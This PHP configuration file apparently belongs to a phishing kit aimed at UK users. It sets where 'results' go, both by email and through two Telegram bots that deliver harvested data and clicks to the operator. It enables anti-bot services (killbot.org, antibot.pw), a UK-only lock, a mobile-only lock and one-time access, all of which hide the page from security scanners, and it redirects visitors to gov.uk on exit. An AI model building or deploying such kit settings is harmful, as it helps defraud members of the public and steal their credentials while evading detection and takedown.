<?php
error_reporting(E_ALL);

$config = json_decode(file_get_contents('control.json'), true);

$to = $config['email_result']; // your results email here

$saveonhost = 0; // save a copy of results on host // 1 for enable and 0 for disable

$ExitLink = "https://www.gov.uk/";

$parameter = isset($_GET[$config['parameter']]) ? $_GET[$config['parameter']] : null;
$parameter_status = $config['parameter_status'];

// some blockers
$internal_antibot = 1;

$One_Time_Access = $config['one_time_access']; //1 for enable and 0 for disable


$enable_killbot = $config['killbot_status']; // this one uses killbot.org blocker // 1 to enable and 0 to disable
$killbot_key = $config['killbot_key']; // external blocker api key u get from here after u topup your balance https://killbot.org/developer [ required if killbot.org is enabled ]

$external_antibot = $config['antibot_status']; // this one uses antibot.pw blocker // 1 to enable and 0 to disable
$apikey = $config['antibot_key']; // external blocker api key u get from here after u topup your balance https://antibot.pw/dashboard/developers [ required if antibot.pw is enabled ]

$mobile_lock = $config['mobile_lock']; // 1 to enable and 0 to disable
$UK_lock = $config['uk_lock'];  //1 for enable and 0 for disable (this is a free api so it may not be accurate)


$telegram_delivery = $config['telegram_deliv_1']; //1 for enable and 0 for disable
$bot_token = $config['bot_token']; // 1123123123:xxxxxxxxxxxxxxxxxxxxxxxxxxx
$chat_id = $config['chat_id']; // ur chat id from @getmyid_bot


// this one for clicks
$telegram_delivery2 = $config['telegram_deliv_2']; //1 for enable and 0 for disable
$bot_token2 = $config['bot_token_2']; // 1123123123:xxxxxxxxxxxxxxxxxxxxxxxxxxx
$chat_id2 = $config['chat_id_2']; // ur chat id from @getmyid_bot




?>